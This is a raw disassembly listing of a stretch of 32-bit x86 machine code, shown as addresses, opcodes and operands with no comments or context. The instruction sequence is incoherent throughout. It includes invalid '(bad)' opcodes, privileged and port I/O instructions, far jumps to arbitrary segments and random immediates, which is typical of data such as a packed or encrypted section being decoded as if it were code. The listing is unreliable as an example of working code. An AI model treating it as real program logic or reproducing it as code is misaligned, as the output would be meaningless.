  41f4d0:	fisub  WORD PTR [esi-0x31a0523b]
  41f4d6:	das    
  41f4d7:	xchg   esp,eax
  41f4d8:	xor    bl,BYTE PTR [esi]
  41f4da:	enter  0xd24d,0xf9
  41f4de:	iret   
  41f4df:	sbb    DWORD PTR [ebx-0x76],ecx
  41f4e2:	pop    ecx
  41f4e3:	in     al,0x2d
  41f4e5:	fstp   DWORD PTR [ebx]
  41f4e7:	inc    esi
  41f4e8:	test   al,ah
  41f4ea:	inc    ebp
  41f4eb:	call   0xfe9d:0x29b183b8
  41f4f2:	jg     0x41f500
  41f4f4:	jecxz  0x41f520
  41f4f6:	pop    esp
  41f4f7:	mov    bh,0x39
  41f4f9:	sbb    BYTE PTR [ecx-0x40],al
  41f4fc:	xchg   ebx,eax
  41f4fd:	and    BYTE PTR [edi-0x2be212d4],0xb6
  41f504:	pop    esi
  41f505:	xor    DWORD PTR [ecx+ebp*1-0x26],edi
  41f509:	xchg   ecx,eax
  41f50a:	out    dx,eax
  41f50b:	hlt    
  41f50c:	in     eax,dx
  41f50d:	inc    ebx
  41f50e:	test   eax,0x8e41198a
  41f513:	ret    0x44ec
  41f516:	jb     0x41f4da
  41f518:	call   0x8464:0x2454dce0
  41f51f:	je     0x41f4f7
  41f521:	imul   ebp,ecx,0xffffff80
  41f524:	mov    es:0x3cf6e4a9,eax
  41f52a:	fcomp  DWORD PTR [ebx-0x77]
  41f52d:	std    
  41f52e:	push   ebx
  41f52f:	mul    BYTE PTR ds:0xb57baa24
  41f535:	ret    
  41f536:	repnz imul esi,DWORD PTR ds:0x9b88c401,0xffffffc5
  41f53e:	int3   
  41f53f:	sbb    al,0xe2
  41f541:	mov    edx,0xe2bcb9ef
  41f546:	mov    al,fs:0x281f988b
  41f54c:	stos   BYTE PTR es:[edi],al
  41f54d:	clc    
  41f54e:	ins    DWORD PTR es:[edi],dx
  41f54f:	out    0x14,al
  41f551:	int    0xcd
  41f553:	imul   ecx,DWORD PTR [ebp+0x379c0621],0x21
  41f55a:	pop    edx
  41f55b:	test   eax,0x90893b44
  41f560:	int3   
  41f561:	push   esp
  41f562:	mov    ecx,0x7ca9fe52
  41f567:	mov    eax,ds:0xb5fed842
  41f56c:	mov    WORD PTR [eax-0x53b6dcf0],cs
  41f572:	cmc    
  41f573:	jbe    0x41f54c
  41f575:	or     BYTE PTR [edx],ch
  41f577:	xchg   esi,eax
  41f578:	and    eax,0x1b9a4d7c
  41f57d:	cmc    
  41f57e:	xor    al,0xeb
  41f580:	loopne 0x41f5f7
  41f582:	data16 jp 0x41f571
  41f585:	pop    edi
  41f586:	sahf   
  41f587:	adc    al,0x98
  41f589:	shr    DWORD PTR [edi-0x59fdd01c],cl
  41f58f:	push   ds
  41f590:	push   esi
  41f591:	xchg   ebp,eax
  41f592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f593:	mov    esp,0x12124fbb
  41f598:	test   esi,ecx
  41f59a:	hlt    
  41f59b:	test   al,0x66
  41f59d:	push   edi
  41f59e:	ja     0x41f551
  41f5a0:	and    DWORD PTR [ebx-0x55a213b],eax
  41f5a6:	stos   BYTE PTR es:[edi],al
  41f5a7:	test   DWORD PTR [ebx+0x24],eax
  41f5aa:	and    al,0xd6
  41f5ac:	inc    ebx
  41f5ad:	hlt    
  41f5ae:	test   BYTE PTR [esi],bh
  41f5b0:	sub    ch,BYTE PTR [ebp-0x45c0d978]
  41f5b6:	pop    ss
  41f5b7:	xchg   edx,eax
  41f5b8:	xor    eax,0x4baf59d6
  41f5bd:	pop    eax
  41f5be:	pop    es
  41f5bf:	pop    edi
  41f5c0:	mov    bl,BYTE PTR [edi-0x23]
  41f5c3:	or     eax,DWORD PTR [ebp+0x790c4a8e]
  41f5c9:	and    eax,DWORD PTR [ecx]
  41f5cb:	sar    DWORD PTR [esi],cl
  41f5cd:	cmp    eax,0x197c870d
  41f5d2:	mov    ch,0x64
  41f5d4:	int3   
  41f5d5:	mov    ebp,0x78ca7688
  41f5da:	ret    
  41f5db:	or     esp,edi
  41f5dd:	xchg   DWORD PTR [ecx],esi
  41f5df:	(bad)
  41f5e2:	out    0xed,al
  41f5e4:	sbb    bh,BYTE PTR [edx+0x3eaaa71f]
  41f5ea:	popf   
  41f5eb:	xchg   DWORD PTR [esi],eax
  41f5ed:	fidivr DWORD PTR [ebx-0x3f]
  41f5f0:	dec    ebp
  41f5f1:	dec    ebp
  41f5f2:	mov    ds:0x239dc3ab,eax
  41f5f7:	xchg   ecx,eax
  41f5f8:	jl     0x41f60d
  41f5fa:	and    ah,BYTE PTR [ecx+0x4b]
  41f5fd:	and    BYTE PTR [ecx-0x77842c2],bl
  41f603:	out    dx,eax
  41f604:	inc    eax
  41f605:	sub    dl,dh
  41f607:	push   edi
  41f608:	mov    edi,0x50941b43
  41f60d:	cmp    edi,DWORD PTR [ebp+0x1b0fbb2c]
  41f613:	push   edi
  41f614:	(bad)  
  41f615:	xlat   BYTE PTR ds:[ebx]
  41f616:	inc    edi
  41f617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f618:	ja     0x41f5d2
  41f61a:	and    BYTE PTR [edi],0x5c
  41f61d:	fsub   DWORD PTR [ecx-0x7]
  41f620:	js     0x41f649
  41f622:	adc    ch,bh
  41f624:	aaa    
  41f625:	loop   0x41f645
  41f627:	sub    al,0xb8
  41f629:	ror    cl,0x38
  41f62c:	lea    esi,[esi-0x527b35bc]
  41f632:	sbb    ebx,ebx
  41f634:	ins    BYTE PTR es:[edi],dx
  41f635:	stos   DWORD PTR es:[edi],eax
  41f636:	sbb    ah,BYTE PTR [edx]
  41f638:	js     0x41f5e2
  41f63a:	iret   
  41f63b:	pop    esp
  41f63c:	and    ch,BYTE PTR [eax-0x725d0ce7]
  41f642:	fsincos 
  41f644:	mov    bh,ch
  41f646:	rsm    
  41f648:	sahf   
  41f649:	dec    ebx
  41f64a:	push   eax
  41f64b:	add    DWORD PTR [edi-0x1b],esp
  41f64e:	add    BYTE PTR [bx+di-0x5978],ch
  41f653:	adc    dl,BYTE PTR [esi+0x14]
  41f656:	mov    ebp,0x9441f49b
  41f65b:	and    DWORD PTR [edi],0xffffffc8
  41f65e:	out    dx,eax
  41f65f:	xchg   esi,eax
  41f660:	pop    es
  41f661:	push   cs
  41f662:	or     al,0x58
  41f664:	jae    0x41f688
  41f666:	jbe    0x41f607
  41f668:	add    eax,0xda912751
  41f66d:	aaa    
  41f66e:	pop    ebx
  41f66f:	add    BYTE PTR [edi+0x78],dl
  41f672:	sub    ebx,DWORD PTR [esi+0x2bdb9fcf]
  41f678:	(bad)  [eax-0x16]
  41f67b:	dec    edi
  41f67c:	mov    edx,0xdcc79afc
  41f681:	pop    eax
  41f682:	jo     0x41f6f6
  41f684:	jns    0x41f6f1
  41f686:	adc    edx,ebp
  41f688:	hlt    
  41f689:	dec    esp
  41f68a:	ins    BYTE PTR es:[edi],dx
  41f68b:	sbb    ah,ch
  41f68d:	inc    edx
  41f68e:	nop
  41f68f:	jno    0x41f6e8
  41f691:	pop    edi
  41f692:	stos   DWORD PTR es:[edi],eax
  41f693:	sub    BYTE PTR [esi-0x45],0x7a
  41f697:	or     al,0xd6
  41f699:	std    
  41f69a:	mov    ch,0x40
  41f69c:	sub    BYTE PTR [ebp-0x5],0xef
  41f6a0:	mov    eax,ds:0x4f266e23
  41f6a5:	inc    edx
  41f6a6:	leave  
  41f6a7:	sub    BYTE PTR es:[ecx+0x4f56a0fc],0xd7
  41f6af:	xchg   ebx,eax
  41f6b0:	jg     0x41f698
  41f6b2:	push   edx
  41f6b3:	sub    ah,0xf2
  41f6b6:	push   ecx
  41f6b7:	xchg   BYTE PTR [eax-0x71b223a4],bl
  41f6bd:	enter  0x7a3f,0x13
  41f6c1:	jnp    0x41f718
  41f6c3:	xchg   edi,eax
  41f6c4:	clc    
  41f6c5:	inc    edx
  41f6c6:	arpl   WORD PTR [edi],cx
  41f6c8:	sbb    eax,0xbafb48b
  41f6cd:	jecxz  0x41f6e3
  41f6cf:	test   BYTE PTR [ebx+0x49bf3a3d],0x54
  41f6d6:	lods   al,BYTE PTR ds:[esi]
  41f6d7:	shl    BYTE PTR [ecx],1
  41f6d9:	out    0x89,eax
  41f6db:	lods   al,BYTE PTR ds:[esi]
  41f6dc:	(bad)  
  41f6dd:	(bad)  
  41f6de:	xchg   esp,eax
  41f6df:	imul   BYTE PTR [eax]
  41f6e1:	jne    0x41f704
  41f6e3:	neg    BYTE PTR [eax+eax*1+0x1fe0b9a2]
  41f6ea:	mov    WORD PTR [ebx],cs
  41f6ec:	xor    ebp,DWORD PTR [ebx-0x507ee5b]
  41f6f2:	scas   eax,DWORD PTR es:[edi]
  41f6f3:	mov    ebp,0x2138a8f0
  41f6f8:	ficom  DWORD PTR ds:0xa10b4466
  41f6fe:	pop    edi
  41f6ff:	sbb    bh,BYTE PTR [ebp+0x6]
  41f702:	retf   
  41f703:	add    dh,BYTE PTR [edx+edx*1+0x74bda8fc]
  41f70a:	(bad)  
  41f70b:	in     eax,dx
  41f70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f70d:	push   ss
  41f70e:	push   0xa7291d96
  41f713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f714:	dec    eax
  41f715:	daa    
  41f716:	lods   al,BYTE PTR ds:[esi]
  41f717:	mov    ds:0x99ea9b15,al
  41f71c:	mov    esp,0xdab5b138
  41f721:	lods   eax,DWORD PTR ds:[esi]
  41f722:	xchg   BYTE PTR [esi],ch
  41f724:	out    0x3a,eax
  41f726:	sub    ebx,DWORD PTR [ebp-0x365067f3]
  41f72c:	mov    edi,0x7cdcb6ad
  41f731:	mov    ecx,0x5540ac7c
  41f736:	in     al,0x86
  41f738:	je     0x41f778
  41f73a:	sub    BYTE PTR ds:0x27c78621,dl
  41f740:	leave  
  41f741:	mov    eax,0x80b154d0
  41f746:	mov    ah,0xfc
  41f748:	hlt    
  41f749:	out    0x18,al
  41f74b:	dec    ecx
  41f74c:	mov    bh,0x24
  41f74e:	rol    BYTE PTR [edi+0xb3bde31],0x4
  41f755:	push   cs
  41f756:	aas    
  41f757:	cli    
  41f758:	mov    ah,BYTE PTR [eax]
  41f75a:	push   eax
  41f75b:	fidivr DWORD PTR [esi]
  41f75d:	or     DWORD PTR [esi+ecx*4-0x45],eax
  41f761:	sbb    al,0xce
  41f763:	mov    al,ds:0xc8b09618
  41f768:	and    edi,esi
  41f76a:	inc    edx
  41f76b:	xor    al,0x71
  41f76d:	adc    al,0xc3
  41f76f:	int    0x6c
  41f771:	mov    cl,BYTE PTR [ebp-0x4]
  41f774:	add    al,0x74
  41f776:	add    eax,0xaa9df3fa
  41f77b:	(bad)  
  41f77c:	stos   BYTE PTR es:[edi],al
  41f77d:	or     bh,BYTE PTR [ebx-0x22aac24d]
  41f783:	inc    eax
  41f784:	xchg   esi,eax
  41f785:	jns    0x41f731
  41f787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f788:	adc    DWORD PTR [esi+eiz*2+0x7a],ebp
  41f78c:	stc    
  41f78d:	fisub  DWORD PTR [ebp+0x7b]
  41f790:	pop    edx
  41f791:	inc    ecx
  41f792:	fs jmp 0x41f7f0
  41f795:	cmp    al,0xf
  41f797:	mov    eax,0x8762c57
  41f79c:	shl    BYTE PTR [ebp-0x2e043e23],0xb3
  41f7a3:	rcl    ah,cl
  41f7a5:	and    DWORD PTR [edx-0xe],ebp
  41f7a8:	mov    ch,0x15
  41f7aa:	mov    al,ds:0x2f8b655e
  41f7af:	and    DWORD PTR [ebp+0x63],edx
  41f7b2:	mov    ebx,0x96915374
  41f7b7:	jns    0x41f7c8
  41f7b9:	dec    ecx
  41f7ba:	retf   
  41f7bb:	add    ebp,ebx
  41f7bd:	addr16 dec esi
  41f7bf:	jnp    0x41f7b8
  41f7c1:	push   0xebca7fcc
  41f7c6:	push   cs
  41f7c7:	pop    edx
  41f7c8:	mov    esi,0x13f040ee
  41f7cd:	push   esp
  41f7ce:	cld    
  41f7cf:	clc    
  41f7d0:	das    
  41f7d1:	add    ecx,DWORD PTR [bx+si]
  41f7d4:	int    0x5d
  41f7d6:	inc    edx
  41f7d7:	aad    0xa1
  41f7d9:	je     0x41f7d9
  41f7db:	ret    
  41f7dc:	fstp   QWORD PTR [bx]
  41f7df:	add    eax,0xb81b57b3
  41f7e4:	mov    bh,0x43
  41f7e6:	inc    esp
  41f7e7:	fmul   DWORD PTR [ebp+0x4a215284]
  41f7ed:	test   DWORD PTR [eax+edx*4-0x5a],0xfd545ba9
  41f7f5:	cs jno 0x41f84d
  41f7f8:	jmp    0xcb977270
  41f7fd:	daa    
  41f7fe:	sar    BYTE PTR [esi],0x77
  41f801:	pop    edx
  41f802:	rol    DWORD PTR [esi-0x41],1
  41f805:	inc    ecx
  41f806:	sbb    BYTE PTR [eax-0x7600cbd8],dh
  41f80c:	cmp    ah,BYTE PTR [ebx]
  41f80e:	or     ah,al
  41f810:	mov    eax,0xaf195da0
  41f815:	adc    BYTE PTR [ebp+0x4172bd0b],ah
  41f81b:	in     eax,0x7e
  41f81d:	(bad)  
  41f81e:	adc    esp,DWORD PTR [ebx+0x4dc257a2]
  41f824:	mov    bl,0x6c
  41f826:	mov    ebp,DWORD PTR [eax-0x66]
  41f829:	xor    al,0x72
  41f82b:	(bad)  
  41f82c:	dec    eax
  41f82d:	hlt    
  41f82e:	out    dx,eax
  41f82f:	aad    0xbd
  41f831:	scas   eax,DWORD PTR es:[edi]
  41f832:	addr16 jl 0x41f8ac
  41f835:	in     al,0xd5
  41f837:	ret    0x9556
  41f83a:	out    dx,al
  41f83b:	int    0xee
  41f83d:	imul   ebp,ebp,0x17
  41f840:	fdivr  QWORD PTR [edi+0x6e3439cd]
  41f846:	out    0x5b,al
  41f848:	mov    dl,0x71
  41f84a:	scas   al,BYTE PTR es:[edi]
  41f84b:	jge    0x41f7fc
  41f84d:	xor    eax,edi
  41f84f:	(bad)  
  41f850:	jmp    0xadb7:0xdd3a5cb7
  41f857:	mov    bl,0x5c
  41f859:	xchg   edi,eax
  41f85a:	es lods eax,DWORD PTR es:[esi]
  41f85d:	pop    edi
  41f85e:	mov    al,ds:0xf4b1ef99
  41f863:	mov    fs,WORD PTR [edx+0x2cc42339]
  41f869:	add    eax,DWORD PTR [eax]
  41f86b:	mov    ebp,0x3377eaa2
  41f870:	test   eax,0xa15cd05e
  41f875:	add    DWORD PTR [esi],edi
  41f877:	push   cs
  41f878:	and    eax,0xdd0a3b1d
  41f87d:	add    esi,esp
  41f87f:	pop    ds
  41f880:	cmp    esi,ecx
  41f882:	int3   
  41f883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f884:	ja     0x41f84a
  41f886:	mov    edx,0x2f66ef53
  41f88b:	fcmovnb st,st(0)
  41f88d:	es repnz mov bl,0x1a
  41f891:	pop    ss
  41f892:	test   DWORD PTR [edx+0x24ce7377],0x13357086
  41f89c:	and    esi,DWORD PTR [ebx+ebp*4-0x2d33527d]
  41f8a3:	data16 (bad) 
  41f8a5:	fisub  DWORD PTR [esi-0xe]
  41f8a8:	mov    WORD PTR [ebx],fs
  41f8aa:	push   esi
  41f8ab:	inc    esi
  41f8ac:	dec    ecx
  41f8ad:	add    eax,0x1c8e0324
  41f8b2:	ret    
  41f8b3:	imul   eax,DWORD PTR [edx+0x2661b79b],0x12
  41f8ba:	dec    ebp
  41f8bb:	cwde   
  41f8bc:	mov    bl,0xd8
  41f8be:	(bad)  
  41f8bf:	mov    ds:0xf72d1b5f,eax
  41f8c5:	jl     0x41f8ca
  41f8c7:	push   esp
  41f8c8:	xor    al,al
  41f8ca:	add    edx,DWORD PTR [esi+0xc]
  41f8cd:	imul   edx,eax,0xffffffb2
  41f8d0:	inc    ebp
  41f8d1:	dec    ecx
  41f8d2:	in     al,dx
  41f8d3:	test   al,ah
  41f8d5:	in     eax,0x7a
  41f8d7:	pop    ecx
  41f8d8:	aas    
  41f8d9:	jb     0x41f93f
  41f8db:	jecxz  0x41f919
  41f8dd:	inc    ebx
  41f8de:	push   ebx
  41f8df:	jae    0x41f86a
  41f8e1:	add    DWORD PTR [esi-0x45],edi
  41f8e4:	sahf   
  41f8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f8e6:	scas   al,BYTE PTR es:[edi]
  41f8e7:	inc    edx
  41f8e8:	mov    eax,ss
  41f8ea:	les    eax,FWORD PTR [edx+esi*8]
  41f8ed:	(bad)  [edi+0x53]
  41f8f0:	or     al,0x48
  41f8f2:	test   al,0x18
  41f8f4:	rcr    BYTE PTR [eax-0x5a],cl
  41f8f7:	hlt    
  41f8f8:	mov    ah,BYTE PTR [ecx+0x7b6ddaac]
  41f8fe:	mov    edx,0xd5af8b5e
  41f903:	inc    edx
  41f904:	rcl    DWORD PTR [esi],0x7c
  41f907:	mov    al,0x62
  41f909:	addr16 hlt 
  41f90b:	dec    eax
  41f90c:	in     eax,dx
  41f90d:	aaa    
  41f90e:	rcr    BYTE PTR [esp+esi*8],1
  41f911:	xor    eax,0xfe0f9c24
  41f916:	mov    ds,esp
  41f918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f919:	or     DWORD PTR [edi+0x25],edx
  41f91c:	popa   
  41f91d:	push   ebx
  41f91e:	xor    ebp,DWORD PTR [ecx+0xc]
  41f921:	ins    BYTE PTR es:[edi],dx
  41f922:	xchg   BYTE PTR [edx],ah
  41f924:	icebp  
  41f925:	push   es
  41f926:	lods   eax,DWORD PTR ds:[esi]
  41f927:	aam    0x9f
  41f929:	dec    esp
  41f92a:	lahf   
  41f92b:	shl    BYTE PTR [eax+edi*8+0x11],1
  41f92f:	push   ebx
  41f930:	jge    0x41f9a3
  41f932:	dec    esp
  41f933:	fld    st(3)
  41f935:	dec    ebx
  41f936:	fimul  DWORD PTR [ebx-0x7]
  41f939:	mov    ds:0xf5f31162,eax
  41f93e:	mov    dl,0xa1
  41f940:	adc    eax,0x79849425
  41f945:	addr16 mov al,0x5
  41f948:	nop
  41f949:	jmp    0xb0a6b7cb
  41f94e:	adc    eax,DWORD PTR [edi+0x49]
  41f951:	xchg   DWORD PTR [edi],edx
  41f953:	adc    al,0xaa
  41f955:	fisubr WORD PTR [edi]
  41f957:	push   ebx
  41f958:	shl    ebp,cl
  41f95a:	cmp    esp,DWORD PTR [eax-0x5a]
  41f95d:	mov    dl,0xcf
  41f95f:	fcom   DWORD PTR [esi-0x29e6115a]
  41f965:	icebp  
  41f966:	or     bl,BYTE PTR [ebx-0x5b5e7048]
  41f96c:	add    DWORD PTR [edx],eax
  41f96e:	push   edx
  41f96f:	jmp    0xd7ab61e4
  41f974:	jns    0x41f921
  41f976:	test   DWORD PTR [ecx+0x6c],edx
  41f979:	inc    ecx
  41f97a:	xlat   BYTE PTR ds:[ebx]
  41f97b:	call   0x87569439
  41f980:	icebp  
  41f981:	popf   
  41f982:	enter  0x9d12,0xa0
  41f986:	mov    WORD PTR cs:[ecx-0x53159028],ds
  41f98d:	cmp    eax,0x473cea45
  41f992:	test   DWORD PTR [edx+edi*1-0x6bd02370],0x5bce7ba0
  41f99d:	jg     0x41f945
  41f99f:	retf   
  41f9a0:	into   
  41f9a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9a2:	out    dx,eax
  41f9a3:	sti    
  41f9a4:	pop    edi
  41f9a5:	mov    bh,bl
  41f9a7:	lods   eax,DWORD PTR ds:[esi]
  41f9a8:	pop    ebx
  41f9a9:	aam    0xd0
  41f9ab:	shr    eax,0xd5
  41f9ae:	cwde   
  41f9af:	cmc    
  41f9b0:	mov    esi,0xdcbd057d
  41f9b5:	xor    eax,0x3a76ce11
  41f9ba:	xor    esi,esp
  41f9bc:	out    0x25,eax
  41f9be:	jno    0x41f9e6
  41f9c0:	or     al,0xa7
  41f9c2:	push   0xffffffbd
  41f9c4:	fs pop edi
  41f9c6:	jmp    0x41f960
  41f9c8:	outs   dx,DWORD PTR ds:[esi]
  41f9c9:	fstp   st(2)
  41f9cb:	inc    edx
  41f9cc:	(bad)  
  41f9cd:	adc    cl,dl
  41f9cf:	jo     0x41f980
  41f9d1:	in     al,dx
  41f9d2:	bound  ebx,QWORD PTR [ebp+0x55]
  41f9d5:	hlt    
  41f9d6:	xchg   edi,eax
  41f9d7:	popa   
  41f9d8:	into   
  41f9d9:	xchg   ebx,eax
  41f9da:	mov    ds:0xcb00a925,eax
  41f9df:	stc    
  41f9e0:	out    0xaa,eax
  41f9e2:	and    eax,0x59cb29e0
  41f9e7:	(bad)  
  41f9e8:	inc    esp
  41f9e9:	pop    edi
  41f9ea:	(bad)  
  41f9eb:	mov    al,ds:0x8a1dcf23
  41f9f0:	(bad)  
  41f9f2:	and    al,0xf9
  41f9f4:	ds fwait
  41f9f6:	jmp    0x45cf:0x4473c00
  41f9fd:	jo     0x41fa2e
  41f9ff:	jge    0x41f9dd
  41fa01:	rol    DWORD PTR [edi+0x6b316307],1
  41fa07:	inc    ebx
  41fa08:	cmp    DWORD PTR [esi-0x2c438e2f],edi
  41fa0e:	in     eax,0xaf
  41fa10:	xchg   ecx,eax
  41fa11:	idiv   BYTE PTR [eax]
  41fa13:	popa   
  41fa14:	rol    ch,cl
  41fa16:	pusha  
  41fa17:	sub    ecx,DWORD PTR [esi]
  41fa19:	ja     0x41f9a5
  41fa1b:	clc    
  41fa1c:	and    al,0x98
  41fa1e:	jmp    0x53fbeee1
  41fa23:	lahf   
  41fa24:	mov    ch,0xf9
  41fa26:	mov    ds:0xd7f12605,eax
  41fa2b:	lds    eax,FWORD PTR [ecx-0x61dde966]
  41fa31:	mov    eax,0x4a543671
  41fa36:	mov    esp,0x1e26b09
  41fa3b:	adc    edx,DWORD PTR [edi]
  41fa3d:	push   edx
  41fa3e:	aad    0xef
  41fa40:	icebp  
  41fa41:	xor    esi,eax
  41fa43:	call   DWORD PTR [edx+0x30]
  41fa46:	aad    0x1b
  41fa48:	mov    ah,0x38
  41fa4a:	out    0xf2,al
  41fa4c:	lea    edi,[eax-0x5]
  41fa4f:	ds sbb bh,bh
  41fa52:	xor    bh,dh
  41fa54:	out    dx,al
  41fa55:	xchg   ebp,eax
  41fa56:	xchg   edi,eax
  41fa57:	call   0x8c9:0x4a57c724
  41fa5e:	retf   0x9561
  41fa61:	(bad)
  41fa65:	loop   0x41faae
  41fa67:	daa    
  41fa68:	and    dl,al
  41fa6a:	push   esp
  41fa6b:	iret   
  41fa6c:	(bad)  
  41fa6d:	shl    DWORD PTR [ebx],0x3d
  41fa70:	xchg   ebx,eax
  41fa71:	outs   dx,BYTE PTR ds:[esi]
  41fa72:	or     eax,0x7fc572b8
  41fa77:	idiv   ch
  41fa79:	fst    DWORD PTR [eax+esi*1+0x56]
  41fa7d:	bnd je 0x41fa02
  41fa80:	dec    esp
  41fa81:	leave  
  41fa82:	js     0x41fae9
  41fa84:	jge    0x41fa45
  41fa86:	cdq    
  41fa87:	push   ecx
  41fa88:	sbb    ch,BYTE PTR ds:[edi+edi*8]
  41fa8c:	out    0x85,al
  41fa8e:	popf   
  41fa8f:	sub    BYTE PTR [edx+0x57],dl
  41fa92:	pop    eax
  41fa93:	enter  0xb3b4,0x30
  41fa97:	nop
  41fa98:	pop    edx
  41fa99:	xor    edx,ecx
  41fa9b:	jb     0x41fb0a
  41fa9d:	pop    ds
  41fa9e:	stc    
  41fa9f:	jg     0x41fad3
  41faa1:	shr    dl,cl
  41faa3:	push   ds
  41faa4:	push   esi
  41faa5:	and    dh,BYTE PTR [eax]
  41faa7:	aad    0xd3
  41faa9:	cli    
  41faaa:	xchg   DWORD PTR [esi+0x4e2e6306],eax
  41fab0:	mov    edx,0x975f3d6d
  41fab5:	dec    edx
  41fab6:	addr16 pusha 
  41fab8:	mov    bl,0xb7
  41faba:	aaa    
  41fabb:	rol    bh,cl
  41fabd:	pop    edx
  41fabe:	lock call 0xc0e1c5fa
  41fac4:	ds jge 0x41fb17
  41fac7:	push   eax
  41fac8:	daa    
  41fac9:	in     al,0xec
  41facb:	push   cs
  41facc:	cmp    ch,dl
  41face:	dec    ecx
  41facf:	push   edx
  41fad0:	ss sahf 
  41fad2:	cmp    al,0x9a
  41fad4:	xchg   ebx,eax
  41fad5:	(bad)  
  41fad7:	cmp    al,0x14
  41fad9:	(bad)  
  41fada:	lods   eax,DWORD PTR ds:[esi]
  41fadb:	jmp    0x41fac8
  41fadd:	xor    BYTE PTR [ebx-0x7619e059],cl
  41fae3:	fdiv   DWORD PTR [ecx+0x1d]
  41fae6:	cli    
  41fae7:	mov    edx,0xec950da5
  41faec:	cs lock aaa 
  41faef:	push   edx
  41faf0:	mov    dh,0x80
  41faf2:	dec    BYTE PTR [ecx-0x2b]
  41faf5:	mov    edx,0xcab0b21a
  41fafa:	xor    BYTE PTR [edx+eax*1+0xc],dh
  41fafe:	cmp    DWORD PTR [ebx+0x2c419187],ecx
  41fb04:	stos   DWORD PTR es:[edi],eax
  41fb05:	test   al,0xee
  41fb07:	outs   dx,DWORD PTR ds:[esi]
  41fb08:	or     eax,0x231464f7
  41fb0d:	pop    es
  41fb0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb0f:	mov    BYTE PTR [eax+0x64],cl
  41fb12:	dec    edi
  41fb13:	cmp    BYTE PTR [eax],ah
  41fb15:	loope  0x41fafc
  41fb17:	jb     0x41fb85
  41fb19:	sbb    BYTE PTR ds:0xb6fa952a,0xc6
  41fb20:	adc    DWORD PTR [esi-0x13d549f8],edi
  41fb26:	in     al,0xcc
  41fb28:	push   esp
  41fb29:	sbb    cl,BYTE PTR [ecx-0x6a]
  41fb2c:	(bad)  
  41fb2d:	shl    BYTE PTR [ecx-0x2b064ed9],1
  41fb33:	push   eax
  41fb34:	sbb    dh,BYTE PTR [ebx+0x5e]
  41fb37:	sub    al,0xc8
  41fb39:	mov    esp,0xb69cb6c3
  41fb3e:	retf   
  41fb3f:	cld    
  41fb40:	iret   
  41fb41:	push   ebx
  41fb42:	repnz iret 
  41fb44:	adc    edx,eax
  41fb46:	stos   BYTE PTR es:[edi],al
  41fb47:	(bad)  
  41fb48:	dec    ebx
  41fb49:	cld    
  41fb4a:	lea    eax,[ebx]
  41fb4c:	rcr    BYTE PTR [edx],0x60
  41fb4f:	scas   al,BYTE PTR es:[edi]
  41fb50:	bound  esi,QWORD PTR [edi]
  41fb52:	push   cs
  41fb53:	lock push eax
  41fb55:	loopne 0x41fbaf
  41fb57:	xchg   edx,eax
  41fb58:	shl    BYTE PTR [eax-0x5c70c7d7],0x11
  41fb5f:	dec    ebx
  41fb60:	dec    eax
  41fb61:	fdivr  DWORD PTR [edi-0x20407635]
  41fb67:	in     al,0x24
  41fb69:	sub    BYTE PTR [esp+ecx*2-0x70],ch
  41fb6d:	mov    eax,DWORD PTR [eax+0x7f]
  41fb70:	cs icebp 
  41fb72:	lea    esp,[ebp-0x71]
  41fb75:	lods   eax,DWORD PTR ds:[esi]
  41fb76:	mov    esp,0x97cc0505
  41fb7b:	fdivr  DWORD PTR [edi+eax*1+0x71]
  41fb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb80:	stc    
  41fb81:	cmp    ebp,eax
  41fb83:	cwde   
  41fb84:	pop    ebp
  41fb85:	jecxz  0x41fbd9
  41fb87:	shr    BYTE PTR [ebp+0x5b],1
  41fb8a:	mov    edi,0xd9444bf2
  41fb8f:	mov    esp,0x1ad870c8
  41fb94:	mov    edi,0x65a9b304
  41fb99:	cmp    dl,BYTE PTR [edx-0x648988ab]
  41fb9f:	cmp    eax,0x86c1cc96
  41fba4:	cld    
  41fba5:	and    eax,0xd9751e74
  41fbaa:	sbb    al,0xdf
  41fbac:	data16 jecxz 0x41fb5f
  41fbaf:	mov    edi,0xe468a9f6
  41fbb4:	mov    edx,0xe744daaa
  41fbb9:	fwait
  41fbba:	mov    dh,0x63
  41fbbc:	adc    BYTE PTR [esi+0x743f6301],ah
  41fbc2:	aas    
  41fbc3:	jns    0x41fbea
  41fbc5:	mov    esi,0x888de866
  41fbca:	cmp    al,0xbb
  41fbcc:	fsub   DWORD PTR [edx]
  41fbce:	push   es
  41fbcf:	dec    ebp
  41fbd0:	outs   dx,DWORD PTR ds:[esi]
  41fbd1:	test   BYTE PTR [ebp-0x679b0e30],bl
  41fbd7:	shl    DWORD PTR [ecx-0x4f],cl
  41fbda:	add    al,0x3a
  41fbdc:	pop    ecx
  41fbdd:	mov    ds:0xefb8c7b7,al
  41fbe2:	inc    edx
  41fbe3:	xchg   BYTE PTR [edx-0x7aec655],dh
  41fbe9:	sub    al,0x46
  41fbeb:	jae    0x41fb7c
  41fbed:	adc    DWORD PTR [edx+0x908ad62],eax
  41fbf3:	pop    ebx
  41fbf4:	in     eax,dx
  41fbf5:	(bad)  
  41fbf6:	pop    esp
  41fbf7:	scas   eax,DWORD PTR es:[edi]
  41fbf8:	and    al,0x22
  41fbfa:	sar    BYTE PTR [edi],cl
  41fbfc:	cld    
  41fbfd:	add    al,0x82
  41fbff:	sbb    bh,BYTE PTR [edi+0x51]
  41fc02:	loope  0x41fbeb
  41fc04:	xchg   edx,eax
  41fc05:	xor    bl,BYTE PTR [esp+ebx*8+0xc]
  41fc09:	(bad)
  41fc0c:	sub    DWORD PTR [ebx+0x49b8c18d],eax
  41fc12:	or     DWORD PTR [edi+edi*4+0x14],esp
  41fc16:	and    eax,0xd222669b
  41fc1b:	fwait
  41fc1c:	enter  0x535e,0xa9
  41fc20:	xor    BYTE PTR [eax-0x29],0x57
  41fc24:	outs   dx,DWORD PTR ds:[esi]
  41fc25:	push   ebp
  41fc26:	shr    DWORD PTR [edx+0x70],0xbb
